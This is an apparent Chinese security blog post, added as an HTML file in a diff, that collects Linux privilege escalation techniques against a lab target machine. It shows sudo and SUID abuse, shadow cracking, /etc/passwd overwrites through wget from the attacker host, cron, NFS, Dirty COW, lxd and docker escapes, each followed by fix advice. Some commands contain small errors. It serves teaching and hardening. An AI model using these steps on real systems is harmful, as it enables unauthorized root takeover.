@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="author" content="magisec网络安全博客" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  
+  <title>Linux特权提升技术合集   | magisec网络安全博客</title>
+
+  
+    <link rel="apple-touch-icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
+    <link rel="icon" href="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://ae01.alicdn.com/kf/U8f9a193ee8f04b09b08b3d8ceedb159d2.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Dmagic</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Linux特权提升技术合集</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2020-12-25
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="Linux提权技术合集"><a href="#Linux提权技术合集" class="headerlink" title="Linux提权技术合集"></a>Linux提权技术合集</h1><h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p>
+<p>靶机IP：192.168.56.117</p>
+<p>用户：muhammad 密码：nasef</p>
+<p>说明：教程中有运用其他环境，都是我以往使用的特权提升技术。</p>
+<h2 id="sudo查看"><a href="#sudo查看" class="headerlink" title="sudo查看"></a>sudo查看</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe544eca18d5" alt="image-20201222194319348"></p>
+<h2 id="apt-get权限滥用特权提升"><a href="#apt-get权限滥用特权提升" class="headerlink" title="apt-get权限滥用特权提升"></a>apt-get权限滥用特权提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update -o APT::Update::Pre-Invoke::&#x3D;&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe544f337145" alt="image-20201222194749860"></p>
+<p>提权完成</p>
+<p>修补建议：为适当的文件设置适当的权限。在这种情况下，请修改/ etc / sudoers 降低不必要的权限。</p>
+<h2 id="二进制程序权限滥用"><a href="#二进制程序权限滥用" class="headerlink" title="二进制程序权限滥用"></a>二进制程序权限滥用</h2><p>该二进制文件有源代码，源代码上面是执行一个shell出来。在sudo中，这个程序不需要root密码即可运行，所以我们使用sudo来运行该二进制文件即可提权。</p>
+<p><img src="https://img.rruu.net/image/5fe544f9441ae" alt="image-20201222194836884"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;sudo</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe544fe8a8d4" alt="image-20201222195029811"></p>
+<p>修补建议：为适当的文件设置适当的权限。在这种情况下，请修改/ etc / sudoers 降低不必要的权限。</p>
+<h2 id="ssh私钥泄露提权"><a href="#ssh私钥泄露提权" class="headerlink" title="ssh私钥泄露提权"></a>ssh私钥泄露提权</h2><p>来到vuln的3目录看见一个key，一眼看出来是一个私钥。推测是root用户的key，我们使用root ssh连接一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat key</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54503cc858" alt="image-20201222200120693"></p>
+<p>保存到kali下</p>
+<p><img src="https://img.rruu.net/image/5fe5450ae70a3" alt="image-20201222200222569"></p>
+<p>要给id_rsa 600权限，要不然读取不到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x id_rsa</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54511eb892" alt="image-20201222200317346"></p>
+<p>ssh key连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.56.117 -i .&#x2F;id_rsa</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54516c18e9" alt="image-20201222200406692"></p>
+<p>修补办法：将私钥删除。</p>
+<h2 id="shadow文件可读"><a href="#shadow文件可读" class="headerlink" title="shadow文件可读"></a>shadow文件可读</h2><p>查找shadow文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;etc&#x2F; | grep shadow</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5451ba6de3" alt="image-20201222202957585"></p>
+<p>读一下shadow文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545204382b" alt="image-20201222203036115"></p>
+<p>发现root密码，我们将root进行破解。</p>
+<p><img src="https://img.rruu.net/image/5fe5452613f35" alt="image-20201222203151280"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5452b5428e" alt="image-20201222203211883"></p>
+<p>获得root密码，su切换root用户完成提权。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54530c914f" alt="image-20201222203329457"></p>
+<p>修补建议：为适当的文件设置适当的权限。在这种情况下，我们应该删除其他用户的阅读权限。</p>
+<h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>搜索具有suid权限的可执行文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54535e5bb7" alt="image-20201222205416808"></p>
+<h3 id="二进制程序权限滥用特权提升"><a href="#二进制程序权限滥用特权提升" class="headerlink" title="二进制程序权限滥用特权提升"></a>二进制程序权限滥用特权提升</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;muhammad&#x2F;vuln&#x2F;1&#x2F;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5453c1a84b" alt="image-20201222205518447"></p>
+<p>这个suid文件，执行之后会有一个shell返回，这个shell是具有root权限的。id查看权限，不是root，但是对/etc/passwd有读写权限，我们来添加一个root用户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;suid</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54540d7b52" alt="image-20201222205616725"></p>
+<p>切回kali，生成密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545479fd08" alt="image-20201222205837567"></p>
+<p>复制目标/etc/passwd到kali下，将我们生成的密码，按照格式写入。</p>
+<p><img src="https://img.rruu.net/image/5fe5454ef3b5d" alt="image-20201222210710593"></p>
+<p>python开启http服务器，使用wget覆盖/etc/passwd。</p>
+<p><img src="https://img.rruu.net/image/5fe5455545346" alt="image-20201222210749391"></p>
+<p>靶机执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5455aec55c" alt="image-20201222210813978"></p>
+<p>退出当前shell，切换magisec用户，密码123456。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su magisec</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5456077ef6" alt="image-20201222210836258"></p>
+<p>修复建议：取消suid文件suid权限</p>
+<h3 id="php特权提升"><a href="#php特权提升" class="headerlink" title="php特权提升"></a>php特权提升</h3><p><img src="https://img.rruu.net/image/5fe3fc9f222a0" alt="image-20201219140613095"></p>
+<p>获取flag</p>
+<p><img src="https://img.rruu.net/image/5fe3fca60826e" alt="image-20201219140653525"></p>
+<h3 id="cp提权"><a href="#cp提权" class="headerlink" title="cp提权"></a>cp提权</h3><p>将靶机的passwd文件，拷贝到kali上面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>openssl生成密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545722068f" alt="image-20201222211645651"></p>
+<p>python启动http服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54576e52c7" alt="image-20201222211727438"></p>
+<p>wget下载passwd文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5457ba94e2" alt="image-20201222211906351"></p>
+<p>cp命令覆盖/etc/passwd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp .&#x2F;passwd &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54580b5f34" alt="image-20201222211959262"></p>
+<p>提权完成</p>
+<p>修复建议：将cp的suid去除</p>
+<h2 id="CRONJOBS特权提升"><a href="#CRONJOBS特权提升" class="headerlink" title="CRONJOBS特权提升"></a>CRONJOBS特权提升</h2><p>查看计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545857cbdd" alt="image-20201223095546811"></p>
+<p>发现系统每一分钟以root权限执行script.sh。我去跟进去看看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat script.sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5458c09151" alt="image-20201223095701572"></p>
+<p>查看权限，发现我们对passwd和script都有读写权限。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545914f8a2" alt="image-20201223095816820"></p>
+<p>我们看一下script的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .&#x2F;script.sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54595ccec1" alt="image-20201223095934163"></p>
+<p>发现，他使用passwd文件覆盖了系统自带的passwd文件，我们对passwd文件有权限，所以我们可以添加一个root权限的用户。切回kali，生成密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5459ad4d0b" alt="image-20201223100129793"></p>
+<p>切回靶机ssh连接，修改passwd文件，修改为这样。</p>
+<p><img src="https://img.rruu.net/image/5fe545a01c4da" alt="image-20201223100151022"></p>
+<p>等待系统执行，我们就可以添加一个用户了。需要一分钟。</p>
+<p><img src="https://img.rruu.net/image/5fe545a652be3" alt="image-20201223100327619"></p>
+<p>我们su切换magisec用户，密码123456.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su magisec</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545ac517c8" alt="image-20201223100409684"></p>
+<p>修复建议：建议将passwd文件与script权限降低，不给普通用户写权限。</p>
+<h2 id="NFS特权提升"><a href="#NFS特权提升" class="headerlink" title="NFS特权提升"></a>NFS特权提升</h2><p>查看靶机挂载目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.56.117</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545b13c523" alt="image-20201223100926200"></p>
+<p>将目标靶机nfs目录挂载到mnt目录中</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.56.117:&#x2F;home&#x2F;muhammad &#x2F;mnt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545b6bcb8f" alt="image-20201223102404945"></p>
+<p>创建setuid</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim .&#x2F;exp.c</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545bc5373d" alt="image-20201223103537054"></p>
+<p>gcc编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545c0f0cec" alt="image-20201223104151886"></p>
+<p>复制到/mnt目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp .&#x2F;exp &#x2F;mnt&#x2F;exp</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545c6d31a6" alt="image-20201223104243518"></p>
+<p>查看/mnt目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545cce75e5" alt="image-20201223104302095"></p>
+<p>赋予suid权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x .&#x2F;exp</span><br></pre></td></tr></table></figure>
+<img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20201223104326335.png" alt="image-20201223104326335"  />
+
+<p>切回靶机，执行exp命令，看id依旧是普通用户，但是此时我们已经具有root权限了，如果要深入利用，可以参考我上面用的passwd攻击手法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545d1bbeae" alt="image-20201223104402814"></p>
+<p>修复建议：合理配置nfs权限，禁止写入。</p>
+<h2 id="历史记录密码泄露"><a href="#历史记录密码泄露" class="headerlink" title="历史记录密码泄露"></a>历史记录密码泄露</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545d67be4f" alt="image-20201223104548656"></p>
+<p>可以看到密码泄露，su切换root用户。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>
+<p>修复建议：清除历史记录，不直接再命令行中使用密码。</p>
+<h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>查看内核版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545db5d78b" alt="image-20201223104945982"></p>
+<p>使用脏牛提权，使用exploit-db的exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux&#x2F;local&#x2F;40839.c -m</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545e03713b" alt="image-20201223111219838"></p>
+<p>使用gcc编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe545e4e7105" alt="image-20201223111328476"></p>
+<p>回传到靶机上</p>
+<p><img src="https://img.rruu.net/image/5fe545e985f32" alt="image-20201223111355938"></p>
+<p>su切换firefart用户</p>
+<p><img src="https://img.rruu.net/image/5fe545ef36cb6" alt="image-20201223111416558"></p>
+<p>发现firefart用户是root组，至此提权完成。</p>
+<p>修复建议：升级内核版本，使用最新版本的ubuntu。</p>
+<h2 id="lxc提权"><a href="#lxc提权" class="headerlink" title="lxc提权"></a>lxc提权</h2><p>id查看用户基本信息，发现在lxd用户组，使用lxd提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe32828e081c" alt="image-20201218101628436"></p>
+<p>github构建提权环境</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;build-alpine</span><br></pre></td></tr></table></figure>
+<p>然后回自动生成一个tar.gz文件，重命名成t.tar.gz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv alpine-v3.12-x86_64-20201217_1534.tar.gz t.tar.gz</span><br></pre></td></tr></table></figure>
+<p>将t.tar.gz文件传输到目标主机上面，使用python开启http服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p>目标主机使用wget下载t.tar.gz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;t.tar.gz</span><br></pre></td></tr></table></figure>
+<p>需要先初始化环境 一切默认</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxd init</span><br></pre></td></tr></table></figure>
+<p>查看一下image</p>
+<p><img src="https://img.rruu.net/image/5fe32828df765" alt="image-20201218102502019"></p>
+<p>发现没有任何镜像，我们导入一下镜像，然后再次查看。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc image import .&#x2F;t.tar.gz --alias dmagicsec</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe32828e4998" alt="image-20201218102541247"></p>
+<p>初始化容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc init dmagicsec dmagicsec -c security.privileged&#x3D;true</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe32828df9f4" alt="image-20201218103022044"></p>
+<p>映射容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc config device add dmagicsec dmagicsec disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe32828e15a6" alt="image-20201218103045116"></p>
+<p>启动容器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc start dmagicsec</span><br></pre></td></tr></table></figure>
+<p>执行交互shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc exec dmagicsec &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe32828e3975" alt="image-20201218103123276"></p>
+<p>获取flag</p>
+<p><img src="https://img.rruu.net/image/5fe5460ce8282" alt="image-20201218103254958"></p>
+<h2 id="docker权限提升"><a href="#docker权限提升" class="headerlink" title="docker权限提升"></a>docker权限提升</h2><p>查看id属于docker组，我们使用docker提权。</p>
+<p><img src="https://img.rruu.net/image/5fe5461256c83" alt="image-20201221111957878"></p>
+<p>提升权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v &#x2F;:&#x2F;mnt bash</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe54616dacf5" alt="image-20201221112029286"></p>
+<p>思路：目前我们将目标靶机的整盘目录挂载到了docker中，且在/mnt目录下，我们修改/mnt目录下面的文件，会直接影响到靶机。所以我们修改/etc/passwd文件，添加root权限用户。</p>
+<p>生成密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opensll passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe5461b85e5e" alt="image-20201221121258488"></p>
+<p>进入我们刚刚root权限的虚拟容器shell，添加用户。格式如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;mnt&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img.rruu.net/image/5fe546206c6a7" alt="image-20201221121420566"></p>
+<p>查看flag文件</p>
+<p><img src="https://img.rruu.net/image/5fe54626beec6" alt="image-20201221121612040"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2020/12/25/school/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2020-12-25
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div class="post-catalog" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF%E5%90%88%E9%9B%86"><span class="toc-text">Linux提权技术合集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%83%85%E5%86%B5"><span class="toc-text">环境情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sudo%E6%9F%A5%E7%9C%8B"><span class="toc-text">sudo查看</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apt-get%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">apt-get权限滥用特权提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8"><span class="toc-text">二进制程序权限滥用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2%E6%8F%90%E6%9D%83"><span class="toc-text">ssh私钥泄露提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shadow%E6%96%87%E4%BB%B6%E5%8F%AF%E8%AF%BB"><span class="toc-text">shadow文件可读</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-text">suid提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">二进制程序权限滥用特权提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">php特权提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cp%E6%8F%90%E6%9D%83"><span class="toc-text">cp提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CRONJOBS%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">CRONJOBS特权提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-text">NFS特权提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-text">历史记录密码泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-text">内核提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lxc%E6%8F%90%E6%9D%83"><span class="toc-text">lxc提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">docker权限提升</span></a></li></ol></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/magisec/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="2933653699@qq.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="Dmagic_hk">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      <a href="">Copyright © magisec 2021</a>
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
